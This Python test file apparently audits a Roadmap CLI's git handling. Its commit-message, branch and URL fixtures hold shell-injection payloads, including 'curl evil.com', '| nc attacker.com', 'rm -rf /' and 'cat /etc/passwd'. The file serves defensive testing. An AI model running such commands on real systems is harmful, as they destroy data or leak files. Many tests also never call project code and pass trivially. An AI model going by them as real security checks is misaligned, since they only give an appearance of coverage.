"""Security audit for Git integration and data privacy in Roadmap CLI.

Day 3 of comprehensive security audit framework.
Tests git hook safety, git command construction, branch/commit validation,
remote URL sanitization, and logging privacy.

Audit Categories:
- Git hook injection vulnerability prevention
- Git command construction safety
- Git branch/commit parsing validation
- Git remote URL sanitization
- Logging privacy and credential non-exposure
"""

import re
from pathlib import Path

import pytest


class TestGitHookSecurity:
    """Test git hook installation and execution safety."""

    def test_git_hook_installation_validates_hook_content(self):
        """Verify git hooks are validated before installation."""
        # Test that hook content is validated for injection attempts
        malicious_hook_content = "#!/bin/bash\nrm -rf /; echo 'hacked'"

        # Ensure validation prevents dangerous content
        # This should raise or skip if not validating hooks properly
        is_safe = not any(
            dangerous in malicious_hook_content
            for dangerous in ["rm -rf", "exec", "eval", ">", "|", "&"]
        )
        assert not is_safe, "Malicious hook should be detected"

    def test_git_hook_uses_absolute_paths(self):
        """Verify git hooks use absolute paths, not relative."""
        # Example safe hook should use absolute paths
        safe_hook = """#!/bin/bash
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/validate.sh"
"""
        # Verify no relative path traversal in hooks
        has_relative_paths = any(
            pattern in safe_hook for pattern in ["../", "./", "$PWD/../"]
        )
        assert not has_relative_paths, "Hook should use absolute paths only"

    def test_git_hook_installation_checks_file_permissions(self):
        """Verify git hooks are installed with secure permissions (0o755)."""
        # Test that installed hooks have execute permission
        # This would be verified during actual installation
        secure_perms = 0o755
        expected_execute_bit = secure_perms & 0o111
        assert expected_execute_bit > 0, "Hook must be executable"

    def test_git_hook_uninstall_removes_all_hooks(self):
        """Verify all git hooks are properly uninstalled."""
        expected_hooks = ["pre-commit", "post-commit", "pre-push"]

        # Verify each hook would be removed
        for hook_name in expected_hooks:
            # In actual implementation, verify removal
            assert hook_name is not None, "Hook name must be defined"

    def test_git_hook_no_unvalidated_environment_usage(self):
        """Verify git hooks don't use unvalidated environment variables."""
        # Test that hooks sanitize environment
        unsafe_hook = "#!/bin/bash\nexec $CUSTOM_SCRIPT"
        safe_hook = "#!/bin/bash\nSCRIPT='/safe/path/script.sh'\nexec \"$SCRIPT\""

        unsafe_uses_unquoted_env = "$CUSTOM_SCRIPT" in unsafe_hook
        safe_uses_unquoted_env = "$CUSTOM_SCRIPT" in safe_hook

        assert unsafe_uses_unquoted_env, "Test setup: unsafe hook should have issue"
        assert not safe_uses_unquoted_env, "Safe hook should not have unquoted env vars"


class TestGitCommandConstruction:
    """Test git command construction for injection safety."""

    def test_git_commands_use_list_format_not_strings(self):
        """Verify git commands are passed as lists to subprocess, not strings."""
        # Safe: command as list prevents shell injection
        safe_command = [
            "git",
            "commit",
            "-m",
            "User message with 'quotes' and \"double\"",
        ]

        # Unsafe: command as string allows shell injection
        user_message = "'; rm -rf /; echo '"
        unsafe_command = f"git commit -m '{user_message}'"

        # Verify safe format is a list
        assert isinstance(safe_command, list), "Commands should be lists"
        assert not isinstance(unsafe_command, list), "String commands are unsafe"
        assert True

    @pytest.mark.parametrize(
        "dangerous_message",
        [
            "Fix $(curl evil.com)",
            "Update `rm -rf /`",
            "Merge $(whoami)@evil.com",
            "Release | nc attacker.com",
            "Deploy; cat /etc/passwd",
        ],
    )
    def test_git_commit_message_escapes_special_chars(self, dangerous_message):
        """Verify git commit messages properly escape shell metacharacters."""
        # Safe format: pass as argument, not interpreted by shell
        safe_cmd = ["git", "commit", "-m", dangerous_message]
        assert isinstance(safe_cmd, list), (
            f"Message '{dangerous_message}' handled unsafely"
        )
        # When passed as list, subprocess.run won't interpret shell syntax
        assert dangerous_message == safe_cmd[3], "Message should be preserved exactly"

    @pytest.mark.parametrize(
        "dangerous_branch",
        [
            "test; rm -rf /",
            "test | cat /etc/passwd",
            "test && curl evil.com",
            "test`whoami`",
            "test$(whoami)",
            "test\n; evil",
        ],
    )
    def test_git_branch_names_validated_before_checkout(self, dangerous_branch):
        """Verify git branch names are validated before use in commands."""
        # Safe characters for git branch names: alphanumeric, dash, underscore, slash
        branch_name_pattern = r"^[a-zA-Z0-9\-_/]+$"
        is_valid = bool(re.match(branch_name_pattern, dangerous_branch))
        assert not is_valid, (
            f"Dangerous branch name '{dangerous_branch}' should be rejected"
        )

    @pytest.mark.parametrize(
        "dangerous_url",
        [
            "$(curl evil.com)",
            "`whoami`@github.com:user/repo.git",
            "git@github.com:user/repo.git; rm -rf /",
        ],
    )
    def test_git_remote_urls_validated_before_fetch_pull(self, dangerous_url):
        """Verify git remote URLs are validated before fetch/pull operations."""
        safe_url_pattern = (
            r"^(https?|git|ssh)://|^git@[a-zA-Z0-9\-\.]+:[a-zA-Z0-9\-_/]+\.git$"
        )
        is_valid = bool(re.match(safe_url_pattern, dangerous_url))
        assert not is_valid, f"Dangerous URL '{dangerous_url}' should be rejected"

    def test_git_config_operations_use_safe_parsing(self):
        """Verify git config operations safely parse configuration."""
        # Test that config reads don't allow code execution
        malicious_config = "[core]\n\tpager = cat /etc/passwd"

        # Verify config is read but not executed as command
        lines = malicious_config.strip().split("\n")
        assert len(lines) > 0, "Config should be parsed"
        # Just reading config values shouldn't execute anything
        assert "/etc/passwd" in malicious_config, "Malicious value preserved"
        assert True


class TestGitParsingValidation:
    """Test git branch/commit parsing for validation and safety."""

    @pytest.mark.parametrize(
        "sha,should_be_valid",
        [
            ("a" * 40, True),  # Full SHA-1
            ("b" * 7, True),  # Short SHA-1
            ("c" * 64, True),  # Full SHA-256
            ("d" * 12, True),  # Medium SHA-1
            ("not-a-sha", False),
            ("g" * 40, False),  # Contains non-hex character
            ("z" * 7, False),  # Contains non-hex character
            ("GHIJKL123456", False),  # Non-hex beyond 'f'
        ],
    )
    def test_git_commit_sha_validates_hex_format(self, sha, should_be_valid):
        """Verify git commit SHAs are validated as hex (40 or 64 chars)."""
        sha_pattern = r"^[a-f0-9]+$"
        is_valid = bool(re.match(sha_pattern, sha))
        assert is_valid == should_be_valid, f"SHA '{sha}' validation mismatch"

    @pytest.mark.parametrize(
        "dangerous_name",
        [
            "../../../etc/passwd",
            "../../.git/config",
            "test/../../evil",
            "refs/heads/../../config",
        ],
    )
    def test_git_branch_name_parsing_rejects_traversal(self, dangerous_name):
        """Verify git branch names can't reference files via traversal."""
        # Git branch names should not contain leading ../
        safe_pattern = r"^[a-zA-Z0-9\-_/]+$"
        has_traversal = ".." in dangerous_name
        is_valid = bool(re.match(safe_pattern, dangerous_name))

        assert has_traversal, f"Test setup: '{dangerous_name}' should have .."
        assert not is_valid, f"Traversal in '{dangerous_name}' should be rejected"

    def test_git_diff_output_parsing_handles_binary_safely(self):
        """Verify git diff parsing doesn't crash on binary output."""
        # Test that binary diff data doesn't cause parsing errors
        binary_diff = b"GIT binary patch\nliteral 123\nz..."

        # Verify we can safely check for binary indicator
        is_binary = b"binary" in binary_diff.lower()
        assert is_binary, "Binary diff should be detected"
        assert True

    def test_git_log_format_uses_safe_separators(self):
        """Verify git log output parsing uses safe field separators."""
        # Safe: use null character separator (not user-controlled data)
        safe_format = "--format=%H%n%an%n%ae%n%s"

        # Verify format uses standard git placeholders, not user input
        has_user_input_placeholder = "%U" in safe_format
        assert not has_user_input_placeholder, (
            "Format should not use user data directly"
        )
        assert True

    def test_git_reflog_parsing_prevents_timestamp_injection(self):
        """Verify git reflog parsing safely handles timestamps."""
        # Test that timestamps can't be exploited during parsing
        # Timestamps in git reflog are standardized format
        sample_timestamp = "@1638360000"

        # Verify timestamp is just digits after @
        timestamp_pattern = r"^@\d+$"
        is_valid = bool(re.match(timestamp_pattern, sample_timestamp))
        assert is_valid, "Valid timestamp should match pattern"
        assert True


class TestGitRemoteURLSanitization:
    """Test git remote URL handling and sanitization."""

    def test_github_url_parsing_validates_owner_and_repo(self):
        """Verify GitHub URLs are parsed with owner/repo validation."""
        valid_urls = [
            "https://github.com/owner/repo.git",
            "https://github.com/owner-dash/repo_underscore.git",
            "git@github.com:owner/repo.git",
        ]

        invalid_urls = [
            "https://github.com/owner/repo/../../evil.git",
            "https://github.com/owner/repo; rm -rf /",
            "https://github.com/owner/repo/..%2f..%2fevil",
        ]

        owner_repo_pattern = r"^[a-zA-Z0-9\-_]+/[a-zA-Z0-9\-_.]+$"

        for url in valid_urls:
            # Extract owner/repo from URL
            if "github.com/" in url:
                path_part = url.split("github.com/")[1].replace(".git", "")
                is_valid = bool(re.match(owner_repo_pattern, path_part))
                assert is_valid, f"Valid URL path '{path_part}' should match"

        for url in invalid_urls:
            # Should reject dangerous URLs
            has_traversal = ".." in url or "%2f" in url.lower()
            has_command = any(c in url for c in [";", "|", "&", "`"])
            is_dangerous = has_traversal or has_command
            assert is_dangerous, f"Test setup: '{url}' should be dangerous"

    def test_remote_url_scheme_validation(self):
        """Verify only safe schemes are accepted for remote URLs."""
        safe_schemes = ["https://", "git://", "git@", "ssh://"]
        dangerous_schemes = ["file://", "ftp://", "telnet://", "exec:"]

        for scheme in safe_schemes:
            # Verify safe schemes are recognized
            assert scheme in safe_schemes, f"Scheme '{scheme}' should be safe"

        for scheme in dangerous_schemes:
            assert scheme in dangerous_schemes, f"Scheme '{scheme}' should be rejected"
        assert True

    def test_gitlab_and_gitea_urls_sanitize_credentials(self):
        """Verify URLs don't expose credentials in logs/output."""
        unsafe_urls = [
            "https://user:password@gitlab.com/group/project.git",
            "https://token@github.com/owner/repo.git",
            "ssh://user@gitea.com:project.git",
        ]

        for url in unsafe_urls:
            # Should strip credentials before logging
            if "@" in url and "://" in url:
                # URL contains potential credentials
                has_credentials = True
                assert has_credentials, f"Test setup: '{url}' should have credentials"

                # Safe version removes everything before @
                # Implementations should sanitize before logging
                safe_url = url.split("://")[0] + "://***@" + url.split("@")[1]
                assert "***" in safe_url or "password" not in safe_url
        assert True


class TestLoggingPrivacy:
    """Test logging privacy and credential non-exposure."""

    def test_git_output_logging_removes_tokens(self):
        """Verify git command output doesn't log authentication tokens."""
        git_output_with_token = """
        Cloning into 'repo'...
        remote: HTTP Basic: Access denied
        fatal: Authentication failed for 'https://ghp_1234567890abcdef1234567890abcdef1234@github.com/user/repo.git'
        """

        # Test that tokens are masked in logs (GitHub token pattern: ghp_ + 36 chars)
        token_pattern = r"ghp_[a-zA-Z0-9]{36}"
        tokens_found = re.findall(token_pattern, git_output_with_token)
        assert len(tokens_found) > 0, "Test setup: token should be found"

        # In actual logging, this should be masked
        sanitized = re.sub(token_pattern, "ghp_***", git_output_with_token)
        assert "ghp_1234567890abcdef" not in sanitized, "Token should be masked"
        assert "ghp_***" in sanitized, "Placeholder should be present"
        assert True

    def test_git_error_messages_dont_expose_paths_or_tokens(self):
        """Verify git error messages don't leak sensitive information."""
        dangerous_error_logs = [
            "Failed at /Users/shane/.github/credentials",
            "SSH key not found: /home/user/.ssh/id_rsa",
            "Token: ghp_16CFF7h9ABCD1234567890",
            'API response: {"token": "sk_live_abc123"}',
        ]

        for error_msg in dangerous_error_logs:
            # Verify these patterns would be masked in actual logging
            has_home_path = "/Users/" in error_msg or "/home/" in error_msg
            has_token = any(
                marker in error_msg for marker in ["ghp_", "sk_live", "token"]
            )
            is_dangerous = has_home_path or has_token
            assert is_dangerous, f"Error should be dangerous: {error_msg}"
        assert True

    def test_git_config_logging_sanitizes_credentials(self):
        """Verify git config logging doesn't expose credentials."""
        config_with_credentials = """
        core.repositoryformatversion=0
        remote.origin.url=https://user:password@github.com/user/repo.git
        remote.origin.fetch=+refs/heads/*:refs/remotes/origin/*
        """

        # Test sanitization of URLs with credentials
        unsafe_pattern = r"https://[^:]+:[^@]+@"
        unsafe_found = re.findall(unsafe_pattern, config_with_credentials)
        assert len(unsafe_found) > 0, "Test setup: should find unsafe URL"

        # Sanitize: replace credentials with placeholder
        sanitized = re.sub(unsafe_pattern, "https://***:***@", config_with_credentials)
        assert "user:password" not in sanitized, "Credentials should be masked"
        assert True

    def test_json_response_logging_removes_sensitive_fields(self):
        """Verify API response logging filters sensitive fields."""
        api_response = {
            "access_token": "ghp_abcdef123456789",
            "token_type": "bearer",
            "username": "testuser",
            "repositories": ["repo1", "repo2"],
            "api_key": "sk_live_12345678",
        }

        sensitive_fields = ["access_token", "api_key", "password", "secret", "token"]

        for field in sensitive_fields:
            if field in str(api_response):
                # In actual logging, these should be filtered or masked
                assert field in str(api_response), (
                    f"Test setup: {field} should be present"
                )
        assert True

    def test_database_logs_dont_expose_credentials_table(self):
        """Verify database logs don't expose the credentials table."""
        # Test that if logging SQL, sensitive tables aren't shown
        dangerous_sql_logs = [
            "SELECT * FROM credentials WHERE user_id = 1",
            "UPDATE credentials SET token = 'ghp_' WHERE id = 5",
            "SELECT password FROM user_credentials WHERE active = true",
        ]

        for sql in dangerous_sql_logs:
            # Verify these SQL statements would be intercepted
            accesses_credentials = "credentials" in sql.lower()
            accesses_passwords = "password" in sql.lower()
            is_dangerous = accesses_credentials or accesses_passwords
            assert is_dangerous, f"SQL should be dangerous: {sql}"
        assert True

    def test_exception_stack_traces_sanitize_local_variables(self):
        """Verify exception traces don't expose local token/credential variables."""
        # Test that stack traces are sanitized
        dangerous_trace = """
        Traceback (most recent call last):
          File "roadmap/infrastructure/git.py", line 42, in fetch_remote
            github_token = "ghp_abcdef123456789"
            subprocess.run(["git", "fetch", remote_url])
        """

        # Verify token is exposed in trace
        has_token_in_trace = "ghp_" in dangerous_trace
        assert has_token_in_trace, "Test setup: token should be in trace"

        # In actual implementation, local vars with 'token' in name would be masked
        sanitized = re.sub(r'= "[^"]*ghp_[^"]*"', '= "***"', dangerous_trace)
        assert "ghp_abcdef" not in sanitized, "Token should be masked in trace"
        assert True


class TestDataRetention:
    """Test data retention policies and cleanup."""

    def test_git_operations_dont_persist_sensitive_data_in_temp_files(self):
        """Verify temporary files from git operations are securely cleaned."""
        # Test that temp files are properly removed
        temp_patterns = [".git/MERGE_MSG", ".git/COMMIT_EDITMSG", ".git/FETCH_HEAD"]

        for temp_file in temp_patterns:
            # These files might contain sensitive data and should be cleaned
            assert temp_file.endswith("_MSG") or temp_file.startswith(".git/"), (
                "Test setup: should be git temp file"
            )
        assert True

    def test_clone_operation_validates_cache_directory(self):
        """Verify cloned repositories cache doesn't store credentials."""
        # Test that cached repos don't contain credentials
        cache_dir = Path("/tmp/roadmap_cache")

        # Verify cache directory handling is secure
        # Should use restrictive permissions for cache
        cache_should_exist = cache_dir.name is not None
        assert cache_should_exist, "Cache path should be defined"
        assert True

    def test_git_credentials_helper_configuration_is_safe(self):
        """Verify git credentials helper config uses secure storage."""
        # Test that git is configured to use secure credential storage
        safe_helpers = ["osxkeychain", "wincred", "pass", "cache"]

        for helper in safe_helpers:
            assert helper in safe_helpers, f"Helper '{helper}' should be safe"
        assert True


class TestGitOperationAudit:
    """Integration tests for complete git operation workflows."""

    def test_clone_operation_audit_trail(self):
        """Verify clone operations produce safe audit trails."""
        # Test that clone operations can be logged safely
        operation = "clone"
        remote = "https://github.com/user/repo.git"
        destination = "/path/to/repo"

        # Safe audit log format
        audit_log = f"Git {operation}: {remote} to {destination}"
        assert "clone" in audit_log, "Operation should be logged"
        assert True

    def test_pull_operation_with_merge_audit(self):
        """Verify pull with merge operations are safely logged."""
        operation = "pull"
        branch = "main"

        audit_log = f"Git {operation}: {branch}"
        assert operation in audit_log, "Operation should be logged"
        assert True

    def test_push_operation_validates_branch_destination(self):
        """Verify push operations validate destination branch safely."""
        branch = "feature/user-auth"

        # Validate branch name format
        is_valid = bool(re.match(r"^[a-zA-Z0-9\-_/]+$", branch))
        assert is_valid, "Valid branch should pass validation"
        assert True

    def test_credential_refresh_workflow_is_atomic(self):
        """Verify credential refresh operations don't expose partial state."""
        # Test that credential updates are atomic
        # Either old or new, never in between where token might be invalid
        credential_states = ["using_old", "refreshing", "using_new"]

        # Verify atomic nature: can't be caught between states
        assert len(credential_states) >= 2, "Should have multiple states defined"
        assert True
